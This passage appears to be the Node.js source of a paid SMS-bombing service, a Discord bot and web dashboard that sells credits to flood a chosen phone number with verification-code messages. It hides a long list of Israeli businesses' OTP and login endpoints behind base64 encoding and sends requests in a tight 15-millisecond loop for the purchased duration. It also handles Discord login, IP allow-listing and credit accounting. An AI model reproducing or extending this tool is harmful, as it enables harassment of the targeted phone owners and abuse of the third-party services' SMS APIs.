        { method: 'POST', url: d("aHR0cHM6Ly93d3cuaWJ1cmdlcmltLmNvLmlsL19hL2FmZl9vdHBfYXV0aA=="), data: d("cGhvbmU9") + phone, headers: { "referer": d("aHR0cHM6Ly93d3cuaWJ1cmdlcmltLmNvLmlsLw=="), "user-agent": ua_base } },
        { method: 'GET', url: d("aHR0cHM6Ly93d3cuYW1lcmljYW5sYXNlci5jby5pbC93cC1qc29uL2NhbGMvdjEvc2VuZC1zbXM/cGhvbmU9") + phone, headers: { "user-agent": ua_base } },
        { method: 'POST', url: d("aHR0cHM6Ly9kZWxpdmVyeS5vc2hpb3NoaS5jby5pbC9oZS9hdXRoL3JlZ2lzdGVyLXNlbmQtY29kZQ=="), data: d("cGhvbmU9") + phone + d("Jl90b2tlbj1iMDRDV2UzUElwYWRYbVY5c0w2Sk8wWHUxTkZJZGx6aEQ2OXI4MHR6"), headers: { "user-agent": ua_base, "x-requested-with": "XMLHttpRequest" } },
        { method: 'POST', url: d("aHR0cHM6Ly93YjBsb3Z2Mno4LmV4ZWN1dGUtYXBpLmV1LXdlc3QtMS5hbWF6b25hd3MuY29tL3Byb2QvYXBpL3YxL2dldE9yZGVyc1NpdGVEYXRh"), data: JSON.stringify({ "id": "uuid", "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": phone }), headers: { "content-type": "application/json", "user-agent": ua_base } },
        { method: 'POST', url: d("aHR0cHM6Ly94dHJhLmNvLmlsL2FwcHMvYXBpL2luZm9ydS9zbXM="), data: JSON.stringify({ "phoneNumber": phone }), headers: { "content-type": "application/json", "user-agent": ua_base } },
        { method: 'POST', url: d("aHR0cHM6Ly9wcm94eTEuY2l0eWNhci5jby5pbC9hcGkvdmVyaWZ5L2xvZ2lu"), data: JSON.stringify({ "phoneNumber": phone.startsWith('972') ? phone : `972${phone.startsWith('0') ? phone.substring(1) : phone}`, "verifyChannel": 1, "loginOrRegister": 1 }), headers: { "content-type": "application/json", "user-agent": ua_base } },
        { method: 'POST', url: d("aHR0cHM6Ly9hcGkuaGF0dXJraS5jb20vYXBpL2xvZ2lu"), data: JSON.stringify({ "phone": phone, "email": false }), headers: { "content-type": "application/json" } },

        // FreeIVR
{ method: 'POST', url: d("aHR0cHM6Ly9mMi5mcmVlaXZyLmNvLmlsL2FwaS92My9wbHVnaW5zL01pdE1WYWxpZFBob25l"), data: JSON.stringify({ "action": "Send", "phone": phone, "recaptchaToken": "0cAFcWeA..." }), headers: { "content-type": "application/json" } }    ];

    // הוספת Atmos - הכל מוצפן ל-Base64
    const atmos_ids = [1, 2, 3, 4, 5, 7, 8, 9, 13, 15, 18, 21, 23, 24, 27, 28, 29, 33, 35, 48, 51, 56, 59, 2008, 2010, 2011, 2012, 2014, 2041, 2052, 2053, 2056, 2058, 2059, 2063, 2070, 2073, 2076, 2078, 2087, 2088, 2091, 2095];
    atmos_ids.forEach(rid => {
        services.push({
            method: 'POST', 
            url: d("aHR0cHM6Ly9hcGktbnMuYXRtb3MuY28uaWwvcmVzdC8=") + rid + d("L2F1dGgvc2VuZFZhbGlkYXRpb25Db2Rl"),
            data: `restaurant_id=${rid}&phone=${phone}&testing=false`,
            headers: { "Content-Type": "application/x-www-form-urlencoded", "user-agent": ua_base }
        });
    });

    for (let i = 0; i < 10; i++) {
        services.push({ method: 'GET', url: d("aHR0cHM6Ly9pdnIuYnVzaW5lc3MvYXBpL0N1c3RvbWVyL2dldFRlbXBDb2RlVG9QaG9uZVZhcmlmaWNhdGlvbi8=") + phone });
    }

    while (stop_signal.active && Date.now() < endTime) {
        services.forEach(s => {
            axios({
                method: s.method,
                url: s.url,
                data: s.data,
                headers: { ...s.headers, "User-Agent": ua_base },
                timeout: 3000
            }).then(() => totalSent++).catch(() => {});
        });
        await new Promise(r => setTimeout(r, 15));
    }

    try {
        await users_col.updateOne({ _id: user_id }, { $inc: { total_sent: totalSent } });
    } catch(e) {}
    active_attacks.delete(user_id);
}


// --- WEB ROUTES (OAUTH & API) ---

app.get('/login', (req, res) => {
    const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify`;
    res.redirect(authUrl);
});

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.send('No code provided');

    try {
        console.log("➡️ [Login] Requesting OAuth Token...");
        const params = new URLSearchParams({
            client_id: CLIENT_ID, client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code', code: code, redirect_uri: REDIRECT_URI
        });

        const tokenRes = await axios.post('https://discord.com/api/oauth2/token', params.toString(), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
        const userRes = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${tokenRes.data.access_token}` } });
        
        const discordId = userRes.data.id;
        
        // תיקון ה-IP
        let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
        if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
        if (clientIp === '::1') clientIp = '127.0.0.1';
        if (clientIp.startsWith('::ffff:')) clientIp = clientIp.substring(7);
        
        console.log(`➡️ [Login] User Identified: ${userRes.data.username} (${discordId}) | IP: ${clientIp}`);
        
        // CHECK ROLE
        try {
            console.log(`➡️ [Login] Checking for role ${REQUIRED_ROLE_ID} in server ${GUILD_ID}...`);
            const memberRes = await axios.get(`https://discord.com/api/v10/guilds/${GUILD_ID}/members/${discordId}`, {
                headers: { Authorization: `Bot ${TOKEN}` }
            });
            if (!memberRes.data.roles.includes(REQUIRED_ROLE_ID)) {
                console.log(`❌ [Login] Access Denied: User missing role.`);
                return res.redirect('/?error=role'); 
            }
            console.log(`✅ [Login] Role confirmed!`);
        } catch(err) {
            console.error(`❌ [Login] Error fetching member data from Discord:`, err.message);
            return res.redirect('/?error=server'); 
        }

        if (isMongoConnected) {
            let user = await users_col.findOne({ _id: Long.fromString(discordId) });
            if(!user) user = await users_col.findOne({ _id: discordId });

            if (!user) {
                console.log(`➡️ [Login] Creating new DB profile for user.`);
                await users_col.insertOne({ 
                    _id: Long.fromString(discordId), 
                    username: userRes.data.username, 
                    credits: 50, 
                    total_sent: 0, 
                    lifetime: false,
                    allowed_ips: [clientIp]
                });
                user = await users_col.findOne({ _id: Long.fromString(discordId) });
            } else {
                let allowed_ips = user.allowed_ips || [];
                if (allowed_ips.length === 0) {
                    allowed_ips.push(clientIp);
                    await users_col.updateOne({ _id: user._id }, { $set: { allowed_ips: allowed_ips } });
                } else if (!allowed_ips.includes(clientIp)) {
                    const secChan = client.channels.cache.get(CHANNELS.SECURITY_LOG);
                    if (secChan) {
                        const emb = new EmbedBuilder()
                            .setTitle("⚠️ Security Alert - Unauthorized IP Login")
                            .setColor(0xFF0000)
                            .addFields(
                                { name: "User", value: `<@${discordId}> (${userRes.data.username})` },
                                { name: "Attempted IP", value: `\`${clientIp}\`` },
                                { name: "Allowed IPs", value: `\`${allowed_ips.join(', ')}\`` }
                            )
                            .setFooter({ text: "Click the button below to approve this IP" });
                            
                        const row = new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                                .setCustomId(`approveip_${discordId}_${clientIp}`)
                                .setLabel('Approve IP')
                                .setStyle(ButtonStyle.Success)
                        );
                        await secChan.send({ embeds: [emb], components: [row] });
                    }
                    console.log(`❌ [Login] Access Denied: IP mismatch for ${discordId} (IP: ${clientIp})`);
                    return res.redirect('/?error=ip_blocked'); 
                }
            }
            
            const genChan = client.channels.cache.get(CHANNELS.GENERAL_LOG);
            if (genChan) {
                const logEmb = new EmbedBuilder()
                    .setTitle("✅ User Logged In")
                    .setDescription(`<@${discordId}> (${userRes.data.username}) logged in via Web Panel.`)
                    .addFields({ name: "IP Address", value: `\`${clientIp}\`` })
                    .setColor(0x00FF00)
                    .setTimestamp();
                genChan.send({ embeds: [logEmb] }).catch(()=>{});
            }
        }
        
        req.session.user = userRes.data;

        req.session.save((err) => {
            if (err) console.error("❌ [Login] Error saving session:", err);
            console.log(`✅ [Login] Session saved successfully, redirecting to Dashboard.`);
            res.redirect('/');
        });
        
    } catch (error) { 
        console.error('❌ [Login] OAuth Critical Error:', error.message);
        res.redirect('/?error=auth'); 
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.get('/api/me', async (req, res) => {
    if (!req.session.user) return res.status(401).json({ error: "Not logged in" });
    
    let stats = { credits: 0, total_sent: 0, lifetime: false };
    if (isMongoConnected) {
        let userDb = await users_col.findOne({ _id: Long.fromString(req.session.user.id) });
        if(!userDb) userDb = await users_col.findOne({ _id: req.session.user.id });

        if (userDb) {
            stats.credits = userDb.credits || 0;
            stats.total_sent = userDb.total_sent || 0;
            stats.lifetime = userDb.lifetime || false;
        }
    }
    res.json({ user: req.session.user, stats: stats });
});

app.get('/api/history', async (req, res) => {
    if (!req.session.user || !isMongoConnected) return res.json({ success: true, history: [] });
    const history = await history_col.find({ discord_id: req.session.user.id }).sort({ time: -1 }).limit(10).toArray();
    res.json({ success: true, history });
});

// קבלת ה-Payload המוצפן מהמשתמש
app.post('/api/send-sms', async (req, res) => {
    try {
        if (!req.session.user) return res.status(401).json({ success: false, error: "Not logged in" });
        if (!isMongoConnected) return res.status(500).json({ success: false, error: "Database offline." });

        let payloadData;
        try {
            const decodedToken = Buffer.from(req.body.token, 'base64').toString('utf-8');
            payloadData = JSON.parse(decodedToken);
        } catch (err) {
            return res.status(400).json({ success: false, error: "Invalid secure payload." });
        }

        let { phone, credits, timeSeconds } = payloadData;
        const userId = req.session.user.id;
        
        if (!phone || phone.length !== 10) return res.status(400).json({ success: false, error: "Invalid phone format" });

        let user = await users_col.findOne({ _id: Long.fromString(userId) });
        if(!user) user = await users_col.findOne({ _id: userId });

        if (!user) return res.status(400).json({ success: false, error: "User not found in database!" });

        let finalSeconds = 0;
        let finalCreditsUsed = 0;

        if (timeSeconds !== undefined && user.lifetime) {
            finalSeconds = parseInt(timeSeconds);
            if(isNaN(finalSeconds) || finalSeconds <= 0 || finalSeconds > 86400) return res.status(400).json({ success: false, error: "Invalid time (Max 24h)" });
            finalCreditsUsed = 0;
        } else {
            credits = parseInt(credits);
            if (isNaN(credits) || credits <= 0) return res.status(400).json({ success: false, error: "Invalid credits" });
            if (!user.lifetime && user.credits < credits) return res.status(400).json({ success: false, error: "Not enough credits!" });
            
            finalSeconds = credits * 15;
            finalCreditsUsed = user.lifetime ? 0 : credits;
        }

        const balanceAfter = user.lifetime ? user.credits : (user.credits - finalCreditsUsed);
        
        if (!user.lifetime && finalCreditsUsed > 0) {
            await users_col.updateOne({ _id: user._id }, { $set: { credits: balanceAfter } });
        }

        await history_col.insertOne({
            discord_id: userId,
            phone: phone,
            credits_used: finalCreditsUsed,
            balance_after: balanceAfter,
            duration: finalSeconds,
            status: "success",
            time: new Date()
        });
        
        const genChan = client.channels.cache.get(CHANNELS.GENERAL_LOG);
        if (genChan) {
            const logEmb = new EmbedBuilder()
                .setTitle("🚀 Website Spam Triggered")
                .setColor(0x00AAFF)
                .addFields(
                    { name: "User", value: `<@${userId}>`, inline: true },
                    { name: "Phone", value: `||${phone}||`, inline: true },
                    { name: "Duration", value: `${finalSeconds}s`, inline: true },
                    { name: "Credits Spent", value: `${finalCreditsUsed}`, inline: true }
                )
                .setTimestamp();
            genChan.send({ embeds: [logEmb] }).catch(()=>{});
        }

        run_spam_logic(userId, phone, finalSeconds).catch(() => {});
        res.json({ success: true, newBalance: balanceAfter, used: finalCreditsUsed, seconds: finalSeconds, lifetime: user.lifetime });

    } catch (e) {
        console.error("API POST /send-sms Error:", e);
        res.status(500).json({ success: false, error: "Internal Server Error." });
    }
});

// --- BOT DISCORD COMMANDS ---
setInterval(async () => {
    try { if (users_col) await force_update_tables(); } catch (e) {}
}, 60000);

async function setupPanels() {
    const pChan = client.channels.cache.get(CHANNELS.PANEL);
    if (pChan) {
        const emb = new EmbedBuilder().setTitle("Vogue Spammer Control Panel").setColor(0x000000).setDescription("Use the buttons below to interact.");
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('v_sp').setLabel('Spam Phone').setStyle(ButtonStyle.Danger).setEmoji('💣'),
            new ButtonBuilder().setCustomId('v_bl').setLabel('My Credits').setStyle(ButtonStyle.Primary).setEmoji('💰'),
            new ButtonBuilder().setLabel('Buy Credits').setStyle(ButtonStyle.Link).setURL('https://vougepayment.xyz').setEmoji('💳')
        );
        const record = await settings_col.findOne({ _id: `msg_panel_v2` });
        if (record) {
            try { const msg = await pChan.messages.fetch(record.msg_id); await msg.edit({ embeds: [emb], components: [row] }); } 
            catch (e) { const new_msg = await pChan.send({ embeds: [emb], components: [row] }); await settings_col.updateOne({ _id: `msg_panel_v2` }, { $set: { msg_id: new_msg.id } }, { upsert: true }); }
        } else {
            const new_msg = await pChan.send({ embeds: [emb], components: [row] }); await settings_col.updateOne({ _id: `msg_panel_v2` }, { $set: { msg_id: new_msg.id } }, { upsert: true });
        }
    }
}

client.on('interactionCreate', async (inter) => {
    if (!users_col) return;
    
    if (inter.isButton()) {
        const id = inter.customId;
        
        if (id.startsWith('approveip_')) {
            const parts = id.split('_');
            const targetId = parts[1];
            const targetIp = parts.slice(2).join('_'); 
            
            let u = await users_col.findOne({ _id: Long.fromString(targetId) });
            if(!u) u = await users_col.findOne({ _id: targetId });
            
            if (u) {
                let ips = u.allowed_ips || [];
                if (!ips.includes(targetIp)) ips.push(targetIp);
                await users_col.updateOne({ _id: u._id }, { $set: { allowed_ips: ips } });
                
                await inter.reply({ content: `✅ IP \`${targetIp}\` has been approved for <@${targetId}>. They can now login.`, flags: [MessageFlags.Ephemeral] });
                
                const newEmb = EmbedBuilder.from(inter.message.embeds[0]).setColor(0x00FF00).setTitle("✅ Security Alert - IP Approved");
                await inter.message.edit({ embeds: [newEmb], components: [] });
            } else {
                await inter.reply({ content: `❌ User not found in DB.`, flags: [MessageFlags.Ephemeral] });
            }
            return;
        }
        
        if (id === 'v_bl') {
            let u = await users_col.findOne({ _id: Long.fromString(inter.user.id) });
            if(!u) u = await users_col.findOne({ _id: inter.user.id }) || { credits: 0 };
            inter.reply({ content: `💳 Credits: **${u.lifetime ? "∞" : u.credits}**`, flags: [MessageFlags.Ephemeral] });
        }
        if (id === 'v_sp') {
            const hasJoined = await isUserInRequiredGuild(inter.user.id);
            if (!hasJoined) return inter.reply({ content: `❌ Join server: ${INVITE_LINK}`, flags: [MessageFlags.Ephemeral] });
            const modal = new ModalBuilder().setCustomId('spam_modal').setTitle("🚀 Vouge Spammer");
            modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('phone_input').setLabel("Phone").setMinLength(10).setMaxLength(10).setStyle(TextInputStyle.Short).setRequired(true)), new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('credit_input').setLabel("Credits").setStyle(TextInputStyle.Short).setRequired(true)));
            await inter.showModal(modal);
        }
        if (id.startsWith('approve_') && !id.startsWith('approveip_')) {
            const parts = id.split('_');
            const phone = parts[1], seconds = parseInt(parts[2]), cost = parseInt(parts[3]);
            let u = await users_col.findOne({ _id: Long.fromString(inter.user.id) });
            if(!u) u = await users_col.findOne({ _id: inter.user.id }) || { credits: 0 };
            
            if (!u.lifetime && u.credits < cost) return inter.reply({ content: "❌ No credits.", flags: [MessageFlags.Ephemeral] });
            if (!u.lifetime) await users_col.updateOne({ _id: u._id }, { $inc: { credits: -cost } });
            inter.reply({ content: `🔥 Spamming ||${phone}||...`, flags: [MessageFlags.Ephemeral] });
            run_spam_logic(inter.user.id, phone, seconds);
        }
    }
    else if (inter.type === InteractionType.ModalSubmit && inter.customId === 'spam_modal') {
        const phone = inter.fields.getTextInputValue('phone_input');
        const cost = parseInt(inter.fields.getTextInputValue('credit_input'));
        let u = await users_col.findOne({ _id: Long.fromString(inter.user.id) });
        if(!u) u = await users_col.findOne({ _id: inter.user.id }) || { credits: 0 };

        if (!u.lifetime && u.credits < cost) return inter.reply({ content: "❌ No credits.", flags: [MessageFlags.Ephemeral] });
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`approve_${phone}_${cost*15}_${cost}`).setLabel('Confirm').setStyle(ButtonStyle.Danger));
        inter.reply({ content: "Confirm Spam?", components: [row], flags: [MessageFlags.Ephemeral] });
    }
});

async function startBot() {
    try {
        const mClient = new MongoClient(MONGO_URI);
        await mClient.connect();
        db = mClient.db("my_app_db"); 
        users_col = db.collection("users");
        history_col = db.collection("sms_history");
        settings_col = db.collection("settings");
        
        isMongoConnected = true; 
        console.log("✅ Database connected successfully!");
        
        client.login(TOKEN);
        client.once('ready', () => {
            console.log(`Bot ${client.user.tag} is LIVE.`);
            setupPanels();
        });

        app.listen(PORT, () => {
            console.log(`🌐 Web Dashboard running on http://localhost:${PORT}`);
        });

    } catch (error) { console.error("Failed to connect to the database:", error); }
}

startBot();